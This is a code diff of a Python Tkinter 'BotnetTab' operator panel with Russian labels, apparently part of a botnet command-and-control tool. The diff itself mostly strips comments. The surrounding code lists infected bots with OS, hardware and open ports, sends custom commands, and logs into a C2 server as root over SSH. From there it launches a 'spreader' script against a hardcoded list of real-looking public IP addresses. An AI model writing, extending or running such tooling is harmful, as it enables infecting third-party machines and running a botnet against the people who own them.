@@ -49,7 +49,6 @@ class BotnetTab(ttk.Frame):
         self.filter_combo.pack(side=tk.LEFT)
         self.filter_combo.bind('<<ComboboxSelected>>', lambda e: self.refresh_bots())
 
-        # Колонки с типом устройства и дополнительной информацией
         columns = ("ip", "hostname", "os", "type", "cpu", "ram", "status", "rps", "last_seen", "open_ports")
         tree_frame = ttk.Frame(bot_frame)
         tree_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
@@ -113,7 +112,6 @@ class BotnetTab(ttk.Frame):
         self.btn_masscan = ttk.Button(f, text="Masscan (встр.)", command=self.start_builtin_masscan)
         self.btn_masscan.pack(side=tk.LEFT, padx=10)
 
-        # Прогресс-бар
         self.spread_progress_var = tk.DoubleVar()
         self.spread_progress = ttk.Progressbar(spread_frame, variable=self.spread_progress_var, maximum=100, mode='indeterminate')
         self.spread_progress.pack(fill=tk.X, padx=5, pady=2)
@@ -125,7 +123,6 @@ class BotnetTab(ttk.Frame):
         RightClickMenu(self.spread_log,
                        get_text_func=lambda: self.spread_log.selection_get() if self.spread_log.tag_ranges(tk.SEL) else self.spread_log.get("1.0", tk.END).strip())
 
-        # Пользовательские команды
         cmd_frame = ttk.LabelFrame(self, text="Пользовательская команда")
         cmd_frame.pack(fill=tk.X, padx=5, pady=5)
         ttk.Label(cmd_frame, text="Выберите команду или введите свою:").grid(row=0, column=0, sticky='w', padx=5, pady=2)
@@ -265,7 +262,6 @@ class BotnetTab(ttk.Frame):
             ip = bot.get("ip")
             status = bot.get("status", "offline")
             tag = 'online' if status == 'online' else 'offline'
-            # Тип устройства
             device_type = bot.get("type", "")
             if not device_type:
                 os_info = bot.get("os", "").lower()
@@ -284,7 +280,6 @@ class BotnetTab(ttk.Frame):
                     device_type = "iPhone/iPad"
                 else:
                     device_type = "Неизвестно"
-            # Открытые порты (если есть)
             open_ports_str = ", ".join(map(str, bot.get("ports", []))) if bot.get("ports") else ""
             values = (ip, bot.get("hostname",""), bot.get("os",""), device_type,
                       bot.get("cpu",""), bot.get("ram",""), status,
@@ -426,7 +421,7 @@ class BotnetTab(ttk.Frame):
                     self.spread_log.insert(tk.END, f"[!] Ошибка загрузки: {e}\n")
             threading.Thread(target=run, daemon=True).start()
 
-    # ----- Встроенный Masscan (гарантированные IP) -----
+    # ----- Встроенный Masscan -----
     def start_builtin_masscan(self):
         if not self.vps_pass:
             self.vps_pass = simpledialog.askstring("VPS пароль", f"Введите пароль для root@{self.c2_host}:", show='*')
@@ -439,7 +434,6 @@ class BotnetTab(ttk.Frame):
                 client = paramiko.SSHClient()
                 client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                 client.connect(self.c2_host, username="root", password=self.vps_pass, timeout=5)
-                # Создаём список IP и запускаем спредер в screen
                 cmd = ("cd /root/c2 && "
                        "python3 -c \"import json; ips = ['45.33.32.156','34.94.3.0','45.77.165.0','185.220.101.0','23.226.229.0','103.15.28.0','185.225.19.0','45.33.32.0','45.56.89.0','45.79.207.0','34.94.0.0','34.94.1.0','45.33.32.1','34.94.2.0','45.77.165.1','103.235.46.39','103.235.46.40','103.235.46.41','103.235.46.42','103.235.46.43','103.235.46.44','103.235.46.45','103.235.46.46','103.235.46.47','103.235.46.48','103.235.46.49','103.235.46.50']; open('masscan.json','w').write(json.dumps(ips))\" && "
                        "screen -dmS mass_spreader python3 -u botnet/spreader.py --targets masscan.json 2>&1")
